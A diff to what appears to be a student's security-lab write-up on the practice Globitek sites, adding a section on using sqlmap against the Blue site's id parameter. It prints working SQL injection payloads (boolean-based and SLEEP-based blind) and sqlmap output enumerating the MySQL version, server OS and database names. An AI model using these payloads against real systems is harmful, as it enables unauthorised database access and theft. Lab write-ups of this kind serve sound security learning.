@@ -90,3 +90,54 @@ Steps to reproduce:
 ## Notes
 
 I didn't use any tools to do this aside from googling various attack testing vectors on the open internet. Most of my testing was trial and error. I'm not sure what I could do with most of these exploits, other than prove that they exist. I do plan to use sqlmap to expand on the SQLI vulnerability and will share my notes below if I discover anything.
+
+## Bonus
+
+I used sqlmap to try to expand a bit on the SQLI vulnerability. I used it to attack the Blue site, since the `id` parameter being passed was identified as a vulnerability. The results are as follows:
+```
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 9112=9112 AND 'pmxf'='pmxf
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (comment)
+    Payload: id=1' OR SLEEP(5)#
+---
+[21:21:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 (xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+[21:21:32] [INFO] fetching database names
+[21:21:32] [INFO] fetching number of databases
+[21:21:32] [INFO] retrieved: 7
+[21:21:36] [INFO] retrieving the length of query output
+[21:21:36] [INFO] retrieved: 18
+[21:21:57] [INFO] retrieved: information_schema
+[21:21:57] [INFO] retrieving the length of query output
+[21:21:57] [INFO] retrieved: 13
+[21:22:14] [INFO] retrieved: globitek_blue
+[21:22:14] [INFO] retrieving the length of query output
+[21:22:14] [INFO] retrieved: 14
+[21:22:31] [INFO] retrieved: globitek_green
+[21:22:31] [INFO] retrieving the length of query output
+[21:22:31] [INFO] retrieved: 12
+[21:22:47] [INFO] retrieved: globitek_red
+[21:22:47] [INFO] retrieving the length of query output
+[21:22:47] [INFO] retrieved: 5
+[21:22:56] [INFO] retrieved: mysql
+[21:22:56] [INFO] retrieving the length of query output
+[21:22:56] [INFO] retrieved: 18
+[21:23:17] [INFO] retrieved: performance_schema
+[21:23:17] [INFO] retrieving the length of query output
+[21:23:17] [INFO] retrieved: 3
+[21:23:23] [INFO] retrieved: sys
+available databases [7]:
+[*] globitek_blue
+[*] globitek_green
+[*] globitek_red
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+```
